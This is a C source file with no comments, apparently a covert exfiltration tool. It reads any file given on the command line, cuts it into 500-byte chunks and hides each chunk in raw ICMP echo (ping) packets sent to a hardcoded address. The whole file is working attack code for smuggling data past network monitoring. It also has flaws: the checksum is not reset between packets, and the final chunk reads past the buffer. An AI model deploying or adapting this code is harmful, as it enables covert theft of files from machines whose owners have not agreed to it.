#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/socket.h>

uint16_t icmp_chk(void *buffer, int len);
int covert_icmp(struct in_addr *dst, char *data);

int main(int argc, char *argv[]) {
    FILE *fp = fopen(argv[1], "rb");
    fseek(fp, 0, SEEK_END);

    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    char *data = malloc(fsize + 1);
    fread(data, fsize, 1, fp);
    fclose(fp);

    data[fsize] = 0;

    printf("data is: %d\n", strlen(data));
    
    struct hostent *host = gethostbyname("192.168.106.1");
    struct in_addr *dst;

    dst = (struct in_addr *)host->h_addr_list[0];

    covert_icmp(dst, data);
    return 0;
}

int covert_icmp(struct in_addr *dst, char *data) {
    struct icmphdr icmp_hdr;
    struct sockaddr_in addr;

    unsigned char packet[2048];

    int ttl = 60;
    int on = 1;
    int chunk_size = 500;
    int chunk = 1;
    int ch;

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if(sock < 0) {
        perror("socket");
        return -1;
    }

    printf("chunk: %d\n", ((strlen(data)+(chunk_size-1))/chunk_size));
    chunk = ((strlen(data)+(chunk_size-1))/chunk_size);

    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr = *dst;
    addr.sin_port = 0;

    memset(&icmp_hdr, 0, sizeof(icmp_hdr));
    icmp_hdr.type = ICMP_ECHO;
    icmp_hdr.checksum = 0;
    icmp_hdr.un.echo.id = 1189;

    if((setsockopt(sock, IPPROTO_IP, IP_TTL, &ttl, sizeof(ttl))) < 0) {
        perror("setsockopt");
        return -1;
    }

    for(int i=0;i<chunk;i++) {

        memcpy(packet, &icmp_hdr, sizeof(icmp_hdr));
        memcpy(packet + sizeof(icmp_hdr), data+(i*chunk_size), chunk_size);

        icmp_hdr.checksum = icmp_chk(packet, sizeof(icmp_hdr)+chunk_size);
        memcpy(packet, &icmp_hdr, sizeof(icmp_hdr));

        if((ch = sendto(sock, packet, sizeof(icmp_hdr) + chunk_size, 0, 
                    (struct sockaddr*)&addr, sizeof(addr))) <= 0) {

            perror("sendto");
            return -1;
        }

    }
    close(sock);

    return 0;
}

uint16_t icmp_chk(void *buffer, int len) {
    unsigned short *buf = buffer;
    unsigned int sum = 0;
    unsigned short result;

    for(sum = 0; len > 1; len -= 2)
        sum += *buf++;
    
    if(len == 1)
        sum += *(unsigned char*)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);

    result = ~sum;
    return result;
}
